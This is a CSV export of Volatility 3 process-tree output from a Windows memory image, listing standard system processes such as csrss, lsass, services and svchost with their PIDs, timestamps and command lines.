Volatility 3 Framework 2.8.0,,,,,,,,,,,,
,,,,,,,,,,,,
PID,PPID,ImageFileName,Offset(V),Threads,Handles,SessionId,Wow64,CreateTime,ExitTime,Audit,Cmd,Path
,,,,,,,,,,,,
4,0,System,0xc90c0345b040,138,-,N/A,FALSE,2024-07-04 10:44:48.000000 UTC,N/A,-,-,-
* 1452,4,MemCompression,0xc90c03551040,66,-,N/A,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,MemCompression,-,-
* 92,4,Registry,0xc90c0349e080,4,-,N/A,FALSE,2024-07-04 10:44:43.000000 UTC,N/A,Registry,-,-
* 300,4,smss.exe,0xc90c06148040,2,-,N/A,FALSE,2024-07-04 10:44:48.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\smss.exe,-,-
416,404,csrss.exe,0xc90c070af140,11,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",C:\Windows\system32\csrss.exe
492,404,wininit.exe,0xc90c07164080,1,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\wininit.exe,-,-
* 636,492,lsass.exe,0xc90c070ab080,8,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\system32\lsass.exe
* 628,492,services.exe,0xc90c070ad140,8,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\services.exe,C:\Windows\system32\services.exe,C:\Windows\system32\services.exe
** 5760,628,svchost.exe,0xc90c0986a2c0,7,-,0,FALSE,2024-07-04 10:45:13.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 6016,628,svchost.exe,0xc90c0967d080,9,-,0,FALSE,2024-07-04 10:46:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 2956,628,svchost.exe,0xc90c08637240,26,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 7692,628,SgrmBroker.exe,0xc90c0a1c5240,7,-,0,FALSE,2024-07-04 10:46:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SgrmBroker.exe,-,-
** 656,628,svchost.exe,0xc90c07d5f2c0,23,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe
** 1040,628,svchost.exe,0xc90c07da8280,22,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p,C:\Windows\System32\svchost.exe
*** 3504,1040,ctfmon.exe,0xc90c08838240,10,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\ctfmon.exe,ctfmon.exe,C:\Windows\system32\ctfmon.exe
